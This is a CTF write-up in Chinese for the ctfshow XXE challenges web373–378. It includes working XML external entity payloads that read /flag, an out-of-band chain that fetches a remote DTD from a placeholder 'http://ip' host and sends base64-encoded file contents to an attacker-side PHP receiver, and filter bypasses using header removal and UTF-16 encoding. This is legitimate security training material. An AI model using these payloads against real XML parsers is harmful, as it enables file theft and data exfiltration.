## ctfshow_xxe（xml外部实体注入漏洞）



### web373

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false); //允许载入外部实体
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument(); //创建一个dom对象
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //解析一个 XML 标签字符串来组成该文档
    $creds = simplexml_import_dom($dom); //把 DOM 节点转换为 SimpleXMLElement 对象。
    $ctfshow = $creds->ctfshow; //引用ctfshow标签
    echo $ctfshow; //输出 ctfshow 标签的内容，节点嵌套
}
highlight_file(__FILE__); 
```

经过分析，该题为有回显的 xxe

payload:

```xml-dtd
[POST]Payload:

<?xml version="1.0"?>
<!DOCTYPE payload [
<!ELEMENT payload ANY>
<!ENTITY xxe SYSTEM "file:///flag">  //定义一个外部实体xxe
]>
<creds>
<ctfshow>&xxe;</ctfshow>
</creds>
```



### web374

无回显xxe

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__); 
```

我们只能将获得的数据通过服务器外带了。

我们需要使用 `参数实体` 

payload:

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ctfshow [
	<!ENTITY % remote SYSTEM "http://ip/data.dtd">
	%remote;
]>
<demo>123</demo>
```

data.dtd

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://ip/1.php?p=%file;'>"> //只能在dtd文件中引用实体
%int;
%send;
```

1.php

```php
<?php
    $data = base64_decode($_GET['p']);
    file_put_contents('flag.txt',$data);
```

首先通过在 payload内部定义dtd的地方调用参数实体 `%remote;` 然后就会相当于文件包含，将 `data.dtd` 内容包含进来，接着调用 `%int;` 此时会引入一个实体，由于其中存在 `%file;` 自动调用了该实体，并将值填入该位置，然后调用 `%send;` 向相应文件`1.php` 发送http请求，把flag保存在txt文件中

`&#x25; 是 % 为了避免冲突`





### web375-376

过滤了文档定义头： `preg_match('/<\?xml version="1\.0"/', $xmlfile)`

我们可以直接去掉xml文档头:

payload:

```xml-dtd
<!DOCTYPE ctfshow [
	<!ENTITY % remote SYSTEM "http://ip/data.dtd">
	%remote;
]>
<demo>123</demo>
```



### web377

又把http过滤掉了，但是xml支持 UTF-16编码，我们可以将 xml编码为utf-16，这样就绕过了过滤：

我们使用python脚本发送post请求：

```python
import requests

url = "http://9e8dfeb6-7cd8-4664-a58d-784a97a422bd.challenge.ctf.show/"
xml = """
<!DOCTYPE ctfshow [
	<!ENTITY % remote SYSTEM "http://ip/data.dtd">
	%remote;
]>
<demo>123</demo>
"""
xml = xml.encode("utf-16")
r = requests.post(url=url, data=xml)
```



### web378

最基本的回显xxe，直接外部实体引用即可











